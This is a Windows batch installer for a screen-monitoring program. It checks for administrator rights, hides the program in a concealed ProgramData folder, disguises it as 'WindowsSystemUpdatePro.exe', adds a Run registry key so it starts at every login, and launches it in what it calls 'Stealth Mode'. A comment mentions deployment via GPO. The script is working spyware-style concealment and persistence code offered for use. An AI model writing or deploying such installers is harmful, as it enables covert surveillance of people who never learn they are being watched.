@echo off
echo ========================================================
echo Screen Monitoring System Pro - Silent Installer
echo ========================================================

REM Requires Administrator privileges
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo Error: You must run this script as Administrator!
    pause
    exit /B
)

set TARGET_DIR="C:\ProgramData\WindowsSystem"
set EXE_NAME="WindowsSystemUpdatePro.exe"

echo [1/4] Creating hidden directory...
mkdir %TARGET_DIR% >nul 2>&1
attrib +h %TARGET_DIR%

echo [2/4] Copying executable...
copy /Y "..\dist\%EXE_NAME%" %TARGET_DIR%\%EXE_NAME% >nul

echo [3/4] Adding to Windows Registry (Auto-start)...
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /V "WindowsSystemUpdatePro" /T REG_SZ /D "%TARGET_DIR%\%EXE_NAME%" /F >nul

echo [4/4] Starting the Service silently...
start "" "%TARGET_DIR%\%EXE_NAME%"

echo Installation complete! The process is now running in Stealth Mode.
REM We do not pause here so the installation feels "instant" if run via GPO
